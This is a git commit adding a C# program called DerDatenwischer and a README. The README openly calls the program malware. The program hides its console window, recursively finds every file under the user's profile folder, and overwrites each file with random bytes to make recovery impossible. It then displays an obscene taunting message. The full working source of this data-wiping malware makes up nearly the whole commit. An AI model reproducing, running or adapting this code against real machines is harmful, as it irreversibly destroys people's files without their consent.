16d8f33b10246e296bf45885f9c2d8137391144b
containedreality <115665205+containedreality@users.noreply.github.com>
2024-05-15 16:15:37 -0400

    Add files via upload

---
+++ DerDatenwischer/Program.cs
@@ -0,0 +1,102 @@
+﻿/*
+Permission to use, copy, modify, and/or distribute this software for
+any purpose with or without fee is hereby granted.
+
+THE SOFTWARE IS PROVIDED “AS IS” AND THE AUTHOR DISCLAIMS ALL
+WARRANTIES WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES
+OF MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE
+FOR ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY
+DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN
+AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT
+OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
+*/
+
+using System;
+using System.IO;
+using System.Collections.Generic;
+using System.Security.Cryptography;
+using System.Runtime.InteropServices;
+
+namespace DerDatenwischer
+{
+    class Program
+    {
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hwnd, int option);
+
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
+
+        public static List<string> files = new List<string>();
+
+        // recursively put listed files in a directory into the files variable
+        public static List<string> ListFiles(string _directory)
+        {
+
+            try
+            {
+                foreach(string file in Directory.GetFiles(_directory))
+                {
+                    files.Add(file);
+                }
+
+                foreach(string directory in Directory.GetDirectories(_directory))
+                {
+                    ListFiles(directory);
+                }
+            }
+            catch(Exception e)
+            {
+                Console.WriteLine(e.Message);
+                return null;
+            }
+            return files;
+        }
+
+        // so we can overwrite the file, hopefully making it harder or impossible to recover.
+        static void Corrupt(string _filename)
+        {
+            try
+            {
+                FileInfo info = new FileInfo(_filename);
+
+                byte[] random = new byte[info.Length * 2];
+
+                RandomNumberGenerator rng = RNGCryptoServiceProvider.Create();
+                rng.GetBytes(random);
+
+                File.WriteAllBytes(_filename, random);
+            }
+            catch(Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+        }
+
+        static void Main(string[] _args)
+        {
+            var handle = GetConsoleWindow();
+
+            ShowWindow(handle, SW_HIDE);
+
+            string home = Environment.GetEnvironmentVariable("UserProfile") + @"\";
+
+            ListFiles($"{home}");
+
+            foreach(var file in files)
+            {
+                Corrupt(file);
+            }
+
+            ShowWindow(handle, SW_SHOW);
+
+            Console.Title = "Fuck You!";
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.WriteLine("You've been fucked!");
+            Console.ReadKey();
+        }
+    }
+}
---
+++ README.md
@@ -0,0 +1,8 @@
+PLEASE THIS IS MALWARE, IT OVER-WRITES ALL FILES IN %USERPROFILE%, DO NOT RUN IT UNLESS YOU PLAN ON GETTING CORRUPTED FILES.
+With this being said, any damages is completely your fault.
+
+[VirusTotal Results](https://www.virustotal.com/gui/file/abdc1f7355d96972d6dfbca633ec4d2d64f7970aa1e1c8ba639bfd8097ba53e3/detection)
+
+I'm mainly uploading this since I put it onto VirusTotal out of curiosity, where for some reason it's currently being called ransomware although never asking for any ransom? along with pinging IP addresses? I mean it's an unobfuscated C# binary, they can just view the source code with [ILSpy](https://github.com/icsharpcode/ILSpy/releases) or similar tools.
+
+In hindsight, I shouldn't have uploaded it to VirusTotal. I should've just kept it as a personal project to learn C#, I should've added a Y/N prompt.
